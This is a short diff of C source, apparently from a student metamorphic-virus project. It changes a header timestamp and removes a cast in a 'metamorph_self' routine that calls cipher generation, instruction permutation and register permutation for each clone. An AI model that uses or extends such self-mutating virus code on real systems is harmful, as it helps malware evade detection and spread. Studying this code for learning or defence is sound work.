@@ -6,7 +6,7 @@
 /*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/12/11 01:29:20 by anselme           #+#    #+#             */
-/*   Updated: 2020/01/12 17:56:57 by ichkamo          ###   ########.fr       */
+/*   Updated: 2020/01/13 20:42:57 by spolowy          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -54,7 +54,7 @@ bool		metamorph_self(struct safe_ptr clone, size_t loader_off, \
 		return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
 
 	// metamorph self and client
-	if (!generate_cypher((void *)cypher, unique_seed, cypher_size)
+	if (!generate_cypher(cypher, unique_seed, cypher_size)
 	|| !generate_decypher(clone_decypher, unique_seed, cypher_size)
 	|| !permutate_instructions(clone_loader_entry, unique_seed, loader_size)
 	|| !permutate_registers(clone_loader_entry, unique_seed, loader_size)
